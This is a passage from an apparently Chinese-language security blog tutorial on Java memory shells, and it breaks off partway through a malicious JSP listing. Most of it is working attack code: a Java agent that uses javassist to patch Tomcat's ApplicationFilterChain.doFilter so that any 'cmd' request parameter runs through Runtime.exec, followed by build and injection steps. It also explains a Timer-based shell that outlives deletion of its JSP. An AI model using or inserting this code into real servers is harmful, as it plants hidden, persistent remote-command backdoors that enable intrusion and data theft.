<p>在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据。Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码。上文介绍的 transform 的注意点也别忘了。再把几个方法粘一下。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>Instrumentation 提供了 addTransformer，getAllLoadedClasses，retransformClasses 等方法，我们后面由于只用到了这三个所以就只介绍这三个</p>
<h5 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer"></a><font color="deeppink">addTransformer</font></h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册提供的转换器</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span><br></pre></td></tr></table></figure></div>

<p>这样当类加载的时候，会进入我们自己的 Transformer 中的 transform 函数进行拦截（自己写Transformer 需要实现 ClassFileTransformer 接口）</p>
<p><strong>注意</strong>：如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can-Retransform-Classes 是否支持类的重新替换</span><br><span class="line">Can-Redefine-Classes 是否支持类的重新定义</span><br></pre></td></tr></table></figure></div>

<p>这两个如果不添加的话，当我们执行的时候是会报错的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvfm koishi.jar koishi.mf .\KoishiPremain.class;jar cvfm cirno.jar cirno.mf .\KoishiSay.class</span><br><span class="line">java -javaagent:koishi.jar=&quot;test&quot; -jar cirno.jar</span><br></pre></td></tr></table></figure></div>

<p>这里加载class我忘了去package，而且javac还找不到类，源码中的class和jar我都删了，有兴趣可以再去搞一个试试，我累了，这东西还挺麻烦的。原理和上面那个差不多，只不过多了一个transform修改源码逻辑。（后面有空了重新补上）</p>
<h3 id="4、启动后加载-agent——agentmain"><a href="#4、启动后加载-agent——agentmain" class="headerlink" title="4、启动后加载 agent——agentmain"></a>4、启动后加载 agent——agentmain</h3><p><strong>执行逻辑</strong></p>
<blockquote>
<ol>
<li>确定要attach到哪个jvm进程中</li>
<li>使用id函数确定jvm进程的pid</li>
<li>使用attach(pid)函数链接这个jvm进程</li>
<li>使用loadAgent将我们的恶意agent.jar包添加进jvm进程中</li>
<li>jvm进程会生成一个instrumentation对象并传到agent.jar包中指定类的agentmain函数中当作参数。</li>
<li>agentmain函数执行。</li>
</ol>
</blockquote>
<p><code>VirtualMachine.list()</code>方法会去寻找当前系统中所有运行着的JVM进程，你可以打印<code>displayName()</code>看到当前系统都有哪些JVM进程在运行。因为main函数执行起来的时候<code>进程名为当前类名</code>，所以通过这种方式可以去找到当前的进程id。</p>
<p>和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类 </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure></div>

<p>要求和之前类似，我们需要满足以下条件</p>
<blockquote>
<ol>
<li>必须要实现 agentmain 方法</li>
<li>Jar 文件清单中必须要含有 Premain-Class 属性</li>
</ol>
</blockquote>
<p>在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。</p>
<p>来查看一下该包中的内容，这里有两个比较重要的类，分别是 VirtualMachine 和 VirtualMachineDescriptor，其中我们重点关注 VirtualMachine 类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/20210614163630.png"
                      alt="image-20210614163630025"
                ></p>
<h4 id="VirtualMachine-1"><a href="#VirtualMachine-1" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p><code>VirtualMachine</code> 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法<code>LoadAgent</code>，<code>Attach</code> 和 <code>Detach</code> 。下面来看看这几个方法的作用</p>
<p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure></div>

<p><strong>loadAgent</strong>：向<code>jvm</code>注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用<code>ClassFileTransformer</code>接口中提供的方法进行处理。</p>
<p><strong>Detach</strong>：从 <code>JVM</code> 上面解除一个代理(agent)</p>
<h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>VirtualMachineDescriptor 是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
<p>所以最后我们的注入流程大致如下：</p>
<blockquote>
<p>通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/20210614164445.png"
                      alt="image-20210614164444958"
                ></p>
<h4 id="Demo（详情见源码）"><a href="#Demo（详情见源码）" class="headerlink" title="Demo（详情见源码）"></a>Demo（详情见源码）</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvfm AgentMain.jar koishiagent.mf KoishiAgent.class KoishiTransformer.class </span><br></pre></td></tr></table></figure></div>

<p>windows下需要将 jdk 的 tools.jar 自行添加到项目依赖，才能进行后续操作，不然会报错。</p>
<p>详情见项目源码</p>
<h4 id="agentmain-内存马"><a href="#agentmain-内存马" class="headerlink" title="agentmain 内存马"></a>agentmain 内存马</h4><p><a class="link"   href="https://github.com/KpLi0rn/AgentMemShell" >KpLi0rn&#x2F;AgentMemShell: JavaAgent内存马 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>其他师傅写好的测试项目</p>
<p>配合 Filter 的 <code>ApplicationFilterChain#doFilter</code>里面封装了用户请求的 request 和 response，我们能够注入，直接获取用户的请求，将执行结果写在 response 中进行返回</p>
<p><strong>ShellAgent.java</strong></p>
<p>首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Java_Agent.agantmain.AgentShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellAgent</span> &#123;</span><br><span class="line">    <span class="comment">// 将目标类设置为我们最喜欢的 ApplicationFilterChain</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p><strong>CirnoTransformer.java</strong></p>
<p>对 transform 拦截的类进行 if 判断，如果被拦截的 classname 等于 ApplicationFilterChain 的话那么就对其进行字节码动态修改</p>
<p>这里利用 insertBefore ，将其插入到前面，从而减少对原程序的功能破坏</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CirnoTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>在resources下创建 META-INF 目录，创建 MANIFEST.MF</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: ShellAgent</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>在pom中配置 maven 的 assembly 插件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- get all project dependencies --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">&lt;!-- MainClass in mainfest make a executable jar --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Project-name</span>&gt;</span>$&#123;project.name&#125;<span class="tag">&lt;/<span class="name">Project-name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Project-version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">Project-version</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>ShellAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- bind to the packaging phase --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>使用assembly的插件下的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly:assembly</span><br></pre></td></tr></table></figure></div>

<p>或者命令行使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn assembly:assembly</span><br></pre></td></tr></table></figure></div>

<p>打包在target下会存在一个有依赖版本和无依赖版本</p>
<p>我们将 agent.jar 已经编写好了，接下来我们需要编写 java 代码来使其加载进去</p>
<p><del>然后配合Evil 类打字节马就行，但是tnnd又没成功，我真服了。。。后面再试吧，研究这个已经耽误2天了</del></p>
<p><del>这个比其他的要多使用一个jar包，挺麻烦的还</del></p>
<p>解决了，tnnd我真是个呆逼，恶意类又忘了继承 AbstractTranslet 类就加载字节码了，md今早上突然想起来了。。。。之前白辛苦搞那么久了，淦！</p>
<p><font color="red"><strong>下次一定一定要记得继承  AbstractTranslet 类！！！！！！！</strong></font></p>
<p>这个马也挺好用的</p>
<h2 id="十一、Timer-型内存马"><a href="#十一、Timer-型内存马" class="headerlink" title="十一、Timer 型内存马"></a>十一、Timer 型内存马</h2><p><a class="link"   href="https://su18.org/post/memory-shell-2/" >JavaWeb 内存马二周目通关攻略 | 素十八 (su18.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>而 jsp 的本质，就是 servlet。 jsp 创建了一个 Timer 计时器对象，在访问了一次这个 jsp 后，会启动一个计时器进行无限循环，一次执行直到服务器重启。即使将这个 jsp 删除，依旧是会继续进行这个任务。</p>
<p>这里依旧以 Tomcat 为例，按照 Servlet 的特点，一个 Servlet 在注册时会被封装成 <code>org.apache.catalina.core.StandardWrapper</code>，在其 mappings 中添加类名，并将访问路径及类名的映射关系存储在 <code>org.apache.catalina.core.StandardContext#servletMappings</code> 中。</p>
</blockquote>
<p><strong>而 jsp 的本质，就是 servlet，只不过由 Tomcat 实现了动态转换、编译、加载、执行的过程</strong></p>
<p>接下来看下 JspServlet 的处理逻辑，总体来说分为三步:</p>
<ol>
<li>JSP 引擎将 <code>.jsp</code> 文件翻译成一个 servlet 源代码;</li>
<li>将 servlet 源代码编译成 <code>.class</code> 文件;</li>
<li>加载并执行这个编译后的文件。</li>
</ol>
<p><strong>一个 jsp 的生命周期</strong></p>
<ol>
<li>在 <code>JspCompilationContext#compile</code> 方法中，会调用 <code>this.jspCompiler.isOutDated()</code> 判断文件状态；</li>
<li>方法根据 <code>JspCompilationContext#getLastModified</code> 方法判断 JSP 本地 resource 是否存在，如果不存在，则通过将 <code>JspCompilationContext#removed</code> 标识为 true 来代表了文件已经被移除；</li>
<li>调用 <code>JspRuntimeContext#removeWrapper</code> 从 <code>JspRuntimeContext#jsps</code> 中移除访问路径与 wrapper 的映射；</li>
<li>随后会抛出 FileNotFoundException 异常，终止后续的处理逻辑。</li>
<li>被移除的 wrapper 因为失去了引用，将会被等待 GC。</li>
</ol>
<p>按理说JSP 被删除后，对应的访问映射不存在了，实际执行的 servlet 实例和 wrapper 对象失去了引用将会等待销毁，被销毁后，里面的代码自然就失效了。</p>
<p><strong>但是由于在恶意代码创建了 Timer 定时任务，而 Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的<code> cancel</code> 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。</strong></p>
<h3 id="恶意jsp"><a href="#恶意jsp" class="headerlink" title="恶意jsp"></a>恶意jsp</h3><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                    <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                target = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (List) getField(target, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                                target = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                threadName = (String) target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(target, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line">                                <span class="keyword">if</span> (threadName != <span class="literal">null</span> &amp;&amp; !threadName.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">note</span> <span class="operator">=</span> target.getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, <span class="type">int</span>.class).invoke(target, <span class="number">1</span>);</span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">req</span>  <span class="operator">=</span> note.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(note);</span><br><span class="line">                                    List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                                    list.add(req);</span><br><span class="line">                                    list.add(threadName);</span><br><span class="line">                                    <span class="keyword">return</span> list;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 